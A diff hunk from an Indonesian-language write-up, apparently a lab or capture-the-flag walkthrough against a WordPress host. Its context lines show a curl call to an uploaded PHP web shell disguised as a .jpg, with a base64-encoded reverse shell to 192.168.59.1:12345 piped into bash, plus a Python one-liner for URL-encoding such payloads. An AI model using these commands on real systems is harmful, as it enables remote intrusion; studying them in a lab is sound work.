@@ -17,7 +17,7 @@ lalu coba aktifkan dengan curl
 ~$ curl -s "http://beloved/wp-content/uploads/2022/12/shell.jpg-1670590514.8364.php?cmd=echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTkuMS8xMjM0NSAwPiYxCg%3D%3D+%7C+base64+-d+%7C+bash"
 ```
 Dan, tidak perlu repot repot untuk menggunakan <https://revshell.com> yang dibuat oleh 0day. Cukup buat string menjadi URL-encoded, dan eksekusi.
-```python
+```sh
 ~$ python -c 'import urllib.parse; string = "(isi string di sini)"; print(urllib.parse.quote_plus(string))'
 ```
 Dengan format seperti ini, btw ini format favorit saya.
